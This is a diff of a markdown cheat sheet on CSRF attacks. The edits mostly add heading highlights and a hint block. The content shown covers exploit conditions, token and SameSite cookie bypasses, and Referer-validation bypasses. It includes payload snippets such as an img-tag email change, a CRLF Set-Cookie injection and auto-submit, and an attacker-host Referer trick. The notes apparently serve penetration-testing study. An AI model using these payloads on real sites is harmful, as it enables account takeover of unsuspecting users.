@@ -1,12 +1,12 @@
 # CSRF
 
-## Conditions
+## <mark style="color:yellow;">Conditions</mark>
 
 * A relevant action. Ex: change password
 * Cookie-based session handling
 * No unpredictable request parameters. If you need to know the value of the existing password it's not vulnerable
 
-## **Exploit**
+## <mark style="color:yellow;">**Exploit**</mark>
 
 **With POST**
 
@@ -29,7 +29,7 @@
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
 ```
 
-## Defences
+## <mark style="color:yellow;">Defences</mark>
 
 <details>
 
@@ -78,7 +78,7 @@ Some applications make use of the HTTP Referer header to attempt to defend again
 
 </details>
 
-## CSRF tokens bypass
+## <mark style="color:yellow;">CSRF tokens bypass</mark>
 
 * Switch from POST to the GET method to bypass
 * Remove the entire parameter containing the token
@@ -97,7 +97,7 @@ Some applications make use of the HTTP Referer header to attempt to defend again
     <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
     ```
 
-## SameSite cookies bypass
+## <mark style="color:yellow;">SameSite cookies bypass</mark>
 
 ### Lax bypass
 
@@ -115,7 +115,7 @@ Some applications make use of the HTTP Referer header to attempt to defend again
     GET /my-account/change-email?email=a@a.com&_method=POST HTTP/1.1
     ```
 
-### Strict bypass
+### <mark style="color:yellow;">Strict bypass</mark>
 
 Bypass via client-side redirect. Consider a page `https://vulnerable-website.com/post/confirm?postId=10` that load this script.
 
@@ -135,9 +135,11 @@ redirectOnConfirmation = () => {
 </script>
 ```
 
-Note: this attack isn't possible with server-side redirects, as browsers recognize the cross-site request and apply cookie restrictions.
+{% hint style="info" %}
+**Note**: this attack isn't possible with server-side redirects, as browsers recognize the cross-site request and apply cookie restrictions.
+{% endhint %}
 
-## Referer-based validation bypass
+## <mark style="color:yellow;">Referer-based validation bypass</mark>
 
 * Some apps validate the Referer header if present, but skip if omitted
   * `<meta name="referrer" content="never">`
@@ -148,8 +150,6 @@ Note: this attack isn't possible with server-side redirects, as browsers recogni
     http://attacker-website.com/vulnerable-website.com
     ```
   * Tip: Instead of use `http://attacker-website.com/vulnerable-website.com` that looks strange you can use `http://attacker-website.com/` and add `<script>history.pushState('', '', '/attacker-website.com')</script>`
-  *   Note: Add `Referrer-Policy: unsafe-url`. One way to set it in html: `<meta name="referrer" content="unsafe-url"/>`
-
-
+  * Note: Add `Referrer-Policy: unsafe-url`. One way to set it in html: `<meta name="referrer" content="unsafe-url"/>`
 
 Firefox 87 new default Referrer Policy ‘`strict-origin-when-cross-origin`’ trimming user sensitive information like path and query string to protect privacy. (https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/)
